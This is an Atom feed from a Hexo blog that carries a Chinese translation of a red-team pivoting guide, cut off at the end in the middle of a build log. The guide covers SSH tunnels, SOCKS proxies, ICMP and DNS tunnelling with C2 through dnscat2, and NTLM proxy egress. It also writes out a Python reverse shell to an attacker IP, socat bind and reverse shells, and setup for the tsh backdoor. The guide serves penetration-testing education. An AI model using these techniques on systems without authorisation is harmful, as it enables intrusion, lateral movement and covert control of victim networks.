<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Howie&#39;s Notes</title>
  <subtitle>Machine Learning and Data Science</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-12-11T04:44:21.106Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Howie Zhao</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一个Red Team成员的跳板(pivoting)指南</title>
    <link href="http://yoursite.com/2017/12/10/%E4%B8%80%E4%B8%AARed-Team%E6%88%90%E5%91%98%E7%9A%84%E8%B7%B3%E6%9D%BF-pivoting-%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2017/12/10/一个Red-Team成员的跳板-pivoting-指南/</id>
    <published>2017-12-10T14:51:35.000Z</published>
    <updated>2017-12-11T04:44:21.106Z</updated>
    
    <content type="html"><![CDATA[<p>本文翻译自<a href="https://artkond.com/2017/03/23/pivoting-guide/" target="_blank" rel="external">https://artkond.com/2017/03/23/pivoting-guide/</a>，正文如下：</p>
<p>渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是red team/pentest参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。<br><a id="more"></a></p>
<h1 id="以公有IP为目标"><a href="#以公有IP为目标" class="headerlink" title="以公有IP为目标"></a>以公有IP为目标</h1><p>一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的RCE漏洞。你上传了一个shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。</p>
<h2 id="SSH端口转发"><a href="#SSH端口转发" class="headerlink" title="SSH端口转发"></a>SSH端口转发</h2><p>设法找到在主机上运行的SSH服务的凭据？很好！连接到主机，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh username@host -D 1080</div></pre></td></tr></table></figure></p>
<p>这将在攻击者一侧产生一个socks服务器（ssh客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机192.168.1.1的内部网络中的SMB共享。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh username@host -L 445:192.168.1.1:445</div></pre></td></tr></table></figure></p>
<p>这样，端口445就会被打开在攻击者一侧。请注意，要绑定特权端口（例如445），你将需要在你的计算机上拥有root权限。</p>
<h3 id="通过SSH的VPN"><a href="#通过SSH的VPN" class="headerlink" title="通过SSH的VPN"></a>通过SSH的VPN</h3><p>由于openssh 4.3版本，可以通过已建立的ssh通道来传输第3层网络流量。这比典型的tcp隧道有优势，因为你在控制ip流量。因此，例如，你可以使用nmap执行SYN扫描，并直接使用你的工具，而无需使用<code>proxychains</code>或其他代理工具。它是通过在客户端和服务器端创建tun设备并通过ssh连接在它们之间传输数据完成的。这很简单，但是由于tun设备的创建是一个特权操作，所以在两台机器上都需要root。这些行应该出现在<code>/etc/ssh/sshd_config</code>文件（服务器端）中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PermitRootLogin yes</div><div class="line">PermitTunnel yes</div></pre></td></tr></table></figure></p>
<p>客户端上的以下命令将在客户端和服务器上创建一对tun设备：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh username@server -w any:any</div></pre></td></tr></table></figure></p>
<p>标志<code>-w</code>接受用冒号分隔的每一侧的tun设备的数量。可以显式设置 —— <code>-w 0:0</code>，也可以使用<code>-w any:any</code>语法来获取下一个可用的tun设备。<br>tun设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0</div></pre></td></tr></table></figure></p>
<p>服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0</div></pre></td></tr></table></figure></p>
<p>在服务器上启用IP转发和NAT：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</div><div class="line">iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure></p>
<p>现在，你可以将对等主机<code>1.1.1.1</code>设置为你的默认网关，或通过它路由到特定的主机/网络：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route add -net 10.0.0.0/16 gw 1.1.1.1</div></pre></td></tr></table></figure></p>
<p>在这个例子中，服务器的外部网络接口是<code>eth0</code>，两端新创建的tun设备是<code>tun0</code>。</p>
<h2 id="3proxy"><a href="#3proxy" class="headerlink" title="3proxy"></a>3proxy</h2><p>在这里获取 - <a href="https://github.com/z3APA3A/3proxy/releases" target="_blank" rel="external">https://github.com/z3APA3A/3proxy/releases</a>。这个工具适用于多个平台。有预编译的Windows二进制文件。至于Linux，你将需要自己编译它，这是一个很简单的事，只是<code>./configure &amp;&amp; make</code> :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为socks代理或端口转发。<br>这个工具从配置文件中获得所有选项。运行它：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">3proxy.exe config_file</div></pre></td></tr></table></figure></p>
<p>或者如果你在Linux系统上：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./3proxy config_file</div></pre></td></tr></table></figure></p>
<p>要在端口1080上运行3proxy作为socks5代理，请在config中放置以下行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socks -p1080</div></pre></td></tr></table></figure></p>
<p>现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于IP的访问控制规则。去检查完整的手册在这里 - <a href="https://3proxy.ru/howtoe.asp" target="_blank" rel="external">https://3proxy.ru/howtoe.asp</a>。要对特定端口进行隧道使用，请用以下语法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt;</div></pre></td></tr></table></figure></p>
<h1 id="NAT场景"><a href="#NAT场景" class="headerlink" title="NAT场景"></a>NAT场景</h1><p>这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。</p>
<h2 id="SSH反向端口转发-w-3proxy"><a href="#SSH反向端口转发-w-3proxy" class="headerlink" title="SSH反向端口转发/w 3proxy"></a>SSH反向端口转发/w 3proxy</h2><p>这个跳板设置看起来像这样：<br>在目标服务器上使用以下配置运行3proxy服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socks -p31337</div></pre></td></tr></table></figure></p>
<p>在接收方（攻击者的机器）上创建一个单独的用户。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adduser sshproxy</div></pre></td></tr></table></figure></p>
<p>这个用户必须是低权限的，不应该有shell权限。毕竟，你不想被反向渗透，你呢？:)编辑/etc/passwd并将shell切换到/bin/false。它应该是这样的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">...</div><div class="line">sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/<span class="literal">false</span></div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>现在使用<code>-R</code>标志连接到新创建的用户的服务器。Linux系统：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh sshproxy@your_server -R 31337:127.0.0.1:31337</div></pre></td></tr></table></figure></p>
<p>对于Windows，你将需要首先上传<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="external">plink.exe</a>。这是一个putty的控制台版本。运行它：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337</div></pre></td></tr></table></figure></p>
<p><code>-R</code>标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行3proxy socks服务（受感染的机器）并通过ssh<code>-R</code>标志访问攻击者主机上的这个端口。</p>
<h2 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h2><p>这是我最喜欢穿越NAT连接的方法。<a href="https://github.com/artkond/rpivot" target="_blank" rel="external">Rpivot</a>是一个反向socks代理工具，可以让你通过socks代理隧道化流量。它连接回你的机器，并绑定一个socks代理。它的工作方式与<code>ssh -D</code>很像，但方向相反。服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0</div></pre></td></tr></table></figure></p>
<p>客户端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python client.py --server-ip &lt;ip&gt; --server-port 9999</div></pre></td></tr></table></figure></p>
<p>结果，一个socks4代理服务将被绑定在服务器端的1080端口。</p>
<h1 id="从内部网络泄漏"><a href="#从内部网络泄漏" class="headerlink" title="从内部网络泄漏"></a>从内部网络泄漏</h1><p>这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。</p>
<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>如果icmp流量被允许到外部网络，那么很可能你可以建立一个icmp隧道。缺点是你需要在目标系统上拥有root/administrator权限，因为有必要使用原始套接字。检查这个工具 - <a href="http://code.gerade.org/hans/" target="_blank" rel="external">http://code.gerade.org/hans/</a>。我个人从来没有尝试过在Windows上运行它。它在Linux上非常有效。服务器端命令（攻击者的机器）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./hans -v -f -s 1.1.1.1 -p P@ssw0rd</div></pre></td></tr></table></figure></p>
<p><code>-v</code>标志是详细的，<code>-f</code>标志在前台运行，<code>-s</code>标志的值是服务器在新创建的tun接口上的ip。<br>客户端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v</div></pre></td></tr></table></figure></p>
<p>连接成功后，客户端应该可以直接在1.1.1.100处看到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ping 1.1.1.100</span></div><div class="line">PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.</div><div class="line">64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms</div></pre></td></tr></table></figure></p>
<p>现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。</p>
<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。<a href="http://dev.kryo.se/iodine/wiki/HowtoSetup" target="_blank" rel="external">这个手册</a>可能会帮助你设置你的名称服务器。</p>
<h3 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h3><p>如果发生这种情况，并且在服务器上获得了root访问权限，你可以试试<a href="http://code.kryo.se/iodine/" target="_blank" rel="external">iodine</a>。它几乎像hans icmp隧道工具一样工作 - 它创建了一对tun适配器，并将它们之间的数据作为DNS查询进行隧道传输。服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com</div></pre></td></tr></table></figure></p>
<p>客户端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iodine -f -P P@ssw0rd tunneldomain.com -r</div></pre></td></tr></table></figure></p>
<p>连接成功将在地址1.1.1.2处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的ssh连接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</div></pre></td></tr></table></figure></p>
<h3 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h3><p><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="external">Dnscat2</a>通过递归DNS查询建立C＆C通道。这个工具不需要root/administrator权限（在windows和linux上都可以）。它也支持端口转发。服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby ./dnscat2.rb tunneldomain.com</div></pre></td></tr></table></figure></p>
<p>客户端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./dnscat2 tunneldomain.com</div></pre></td></tr></table></figure></p>
<p>在收到服务器端的连接后，可以使用<code>windows</code>命令查看活动会话：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dnscat2&gt; windows</div><div class="line">0 :: main [active]</div><div class="line">  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]</div><div class="line">  1 :: <span class="built_in">command</span> session (debian)</div><div class="line">  2 :: sh (debian) [*]</div></pre></td></tr></table></figure></p>
<p>要启动端口转发，请选择带有<code>session -i &lt;num&gt;</code>的命令会话：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">dnscat2&gt; session -i 1</div><div class="line">New window created: 1</div><div class="line">New window created: 1</div><div class="line">history_size (session) =&gt; 1000</div><div class="line">This is a <span class="built_in">command</span> session!</div><div class="line"></div><div class="line">That means you can enter a dnscat2 <span class="built_in">command</span> such as</div><div class="line"><span class="string">'ping'</span>! For a full list of clients, try <span class="string">'help'</span>.</div><div class="line"></div><div class="line"><span class="built_in">command</span> session (debian) 1&gt;</div></pre></td></tr></table></figure></p>
<p>使用<code>listen [lhost:]lport rhost:rport</code>命令转发一个端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">command</span> session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80</div></pre></td></tr></table></figure></p>
<p>这将绑定攻击者机器上的8080端口，并将所有连接转发到10.0.0.20:80。</p>
<h2 id="公司的HTTP代理作为一种出路"><a href="#公司的HTTP代理作为一种出路" class="headerlink" title="公司的HTTP代理作为一种出路"></a>公司的HTTP代理作为一种出路</h2><p>HTTP代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;）</p>
<h3 id="Rpivot-1"><a href="#Rpivot-1" class="headerlink" title="Rpivot"></a>Rpivot</h3><p>我已经在NAT穿越部分提到了这个工具。它还支持通过NTLM HTTP代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\</div><div class="line">--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</div><div class="line">--username Alice --password P@ssw0rd</div></pre></td></tr></table></figure></p>
<p>或者如果你有LM:NT哈希而不是密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python client.py --server-ip &lt;rpivot_server_ip&gt;\</div><div class="line">--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</div><div class="line">--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45</div></pre></td></tr></table></figure></p>
<h3 id="Cntlm"><a href="#Cntlm" class="headerlink" title="Cntlm"></a>Cntlm</h3><p><a href="http://cntlm.sourceforge.net/" target="_blank" rel="external">Cntlm</a>是通过NTLM代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口443（这个端口是最有可能被允许通过代理的）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Username Alice</div><div class="line">Password P@ssw0rd</div><div class="line">Domain CONTOSO.COM</div><div class="line">Proxy 10.0.0.10:8080</div><div class="line">Tunnel 2222:&lt;attackers_machine&gt;:443</div></pre></td></tr></table></figure></p>
<p>运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cntlm.exe -c config.conf</div></pre></td></tr></table></figure></p>
<p>或者如果你在Linux上：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./cntlm -c config.conf</div></pre></td></tr></table></figure></p>
<p>现在，假设你已经在远程主机的443端口上运行ssh，你可以启动ssh客户端（openssh/putty）并连接到本地端口2222来访问外部机器。</p>
<h3 id="通过HTTP代理的OpenVpn"><a href="#通过HTTP代理的OpenVpn" class="headerlink" title="通过HTTP代理的OpenVpn"></a>通过HTTP代理的OpenVpn</h3><p><a href="https://openvpn.net/index.php/open-source/documentation/howto.html" target="_blank" rel="external">OpenVpn</a>是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过NTLM代理的隧道TCP连接。将此行添加到你的配置文件中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm</div></pre></td></tr></table></figure></p>
<p>凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要root。</p>
<h1 id="利用带有proxychains的SOCKS"><a href="#利用带有proxychains的SOCKS" class="headerlink" title="利用带有proxychains的SOCKS"></a>利用带有proxychains的SOCKS</h1><p>如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用<code>proxychains</code>来强制你的程序通过socks代理。编辑/etc/proxychains.conf中的代理服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[ProxyList]</div><div class="line"><span class="comment"># add proxy here ...</span></div><div class="line"><span class="comment"># meanwile</span></div><div class="line"><span class="comment"># defaults set to "tor"</span></div><div class="line">socks4  127.0.0.1 3128</div></pre></td></tr></table></figure></p>
<p>准备好了，只需在你最喜欢的pwn工具上添加<code>proxychains</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains program_name</div></pre></td></tr></table></figure></p>
<p>与proxychains一起使用的impacket’s psexec.py：<br>(/images/pivoting1.png)</p>
<h1 id="DNS与proxychains"><a href="#DNS与proxychains" class="headerlink" title="DNS与proxychains"></a>DNS与proxychains</h1><p>Proxychains在解析主机名时不遵循socks RFC。它拦截<code>gethostbyname</code> libc调用并通过socks代理隧道化tcp DNS请求。事情是，DNS服务器硬编码到<code>4.2.2.2</code>。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试Windows环境，将名称服务器更改为域控制器。该设置位于<code>/usr/lib/proxychains3/proxyresolv</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="comment"># This script is called by proxychains to resolve DNS names</span></div><div class="line"></div><div class="line"><span class="comment"># DNS server used to resolve names</span></div><div class="line">DNS_SERVER=<span class="variable">$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125;</span>    <span class="comment">#change nameserver here</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> = 0 ] ; <span class="keyword">then</span></div><div class="line">    <span class="built_in">echo</span> <span class="string">"  usage:"</span></div><div class="line">    <span class="built_in">echo</span> <span class="string">"      proxyresolv &lt;hostname&gt; "</span></div><div class="line">    <span class="built_in">exit</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure></p>
<h1 id="美化你的web-shell"><a href="#美化你的web-shell" class="headerlink" title="美化你的web shell"></a>美化你的web shell</h1><p>这部分内容与pivoting或tunneling没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用web-shell非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给sudo/su或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将web-shell升级到一个交互式shell时，我这样做:)我不会介绍像使用bash/perl/python等启动半交互式shell。有很多关于这样做的信息。看看这个反向shell备忘单 - <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet。" target="_blank" rel="external">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet。</a><br>哈哈哈哈哈哈</p>
<h2 id="Python-PTY-shell"><a href="#Python-PTY-shell" class="headerlink" title="Python PTY shell"></a>Python PTY shell</h2><p>从常规的半交互式shell升级。你可以在现有的shell中执行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></div></pre></td></tr></table></figure></p>
<p>或者启动反向连接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import socket,subprocess,os;\</span></div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\</div><div class="line">s.connect(("&lt;attackers_ip&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\</div><div class="line">os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</div></pre></td></tr></table></figure></p>
<h2 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h2><p>Netcat的加强版！可是说实话，去检查这个<a href="http://www.dest-unreach.org/socat/" target="_blank" rel="external">工具</a>的手册<code>man socat</code>，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的shell，甚至比前面提到的python-pty更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类Unix发行版中的默认工具。</p>
<h3 id="绑定shell"><a href="#绑定shell" class="headerlink" title="绑定shell"></a>绑定shell</h3><p>设置监听器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane</div></pre></td></tr></table></figure></p>
<p>连接到监听器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat FILE:`tty`,raw,<span class="built_in">echo</span>=0 TCP:&lt;victim_ip&gt;:1337</div></pre></td></tr></table></figure></p>
<h3 id="反向shell："><a href="#反向shell：" class="headerlink" title="反向shell："></a>反向shell：</h3><p>设置监听器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,<span class="built_in">echo</span>=0</div></pre></td></tr></table></figure></p>
<p>连接到攻击者的机器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane</div></pre></td></tr></table></figure></p>
<h3 id="终端大小"><a href="#终端大小" class="headerlink" title="终端大小"></a>终端大小</h3><p>默认情况下，终端的大小是相当小的，当启动<code>top</code>命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用<code>stty -a</code>命令来获得你的常规终端的大小：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ stty -a</div><div class="line">speed 38400 baud; rows 57; columns 211; line = 0;</div></pre></td></tr></table></figure></p>
<p>将所需的尺寸应用到你的socat终端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ stty rows 57 cols 211</div></pre></td></tr></table></figure></p>
<h2 id="Tsh"><a href="#Tsh" class="headerlink" title="Tsh"></a>Tsh</h2><p><a href="https://github.com/creaktive/tsh" target="_blank" rel="external">Tsh</a>是一个小型的ssh式后门，带有完整的pty终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类Unix系统上编译。从编辑tsh.h文件开始：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> *secret = <span class="string">"never say never say die"</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 22</span></div><div class="line"><span class="keyword">short</span> <span class="keyword">int</span> server_port = SERVER_PORT;</div><div class="line"><span class="comment">/*</span></div><div class="line">#define CONNECT_BACK_HOST  "localhost"</div><div class="line">#define CONNECT_BACK_DELAY 30</div><div class="line">*/</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></div></pre></td></tr></table></figure></p>
<p>更改<code>secret</code>，指定<code>SERVER_PORT</code>。如果你想反向连接，取消注释并编辑<code>CONNECT_BACK_HOST</code>和<code>CONNECT_BACK_DELAY</code>指令。运行make：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ make linux_x64</div><div class="line">make								\</div><div class="line">	LDFLAGS=<span class="string">" -Xlinker --no-as-needed -lutil"</span>	\</div><div class="line">	DEFS=<span class="string">" -DLINUX"</span>					\</div><div class="line">	tsh tshd</div><div class="line">make[1]: Entering directory <span class="string">'/tmp/tsh'</span></div><div class="line">gcc -O3 -W -Wall -DLINUX -c pel.c</div><div class="line">gcc -O3 -W -Wall -DLINUX -c aes.c</div><div class="line">gcc -O3 -W -Wall -DLINUX -c sha1.c</div><div class="line">gcc -O3 -W -Wall -DLINUX -c tsh.c</div><div class="line">gcc -Xlinker 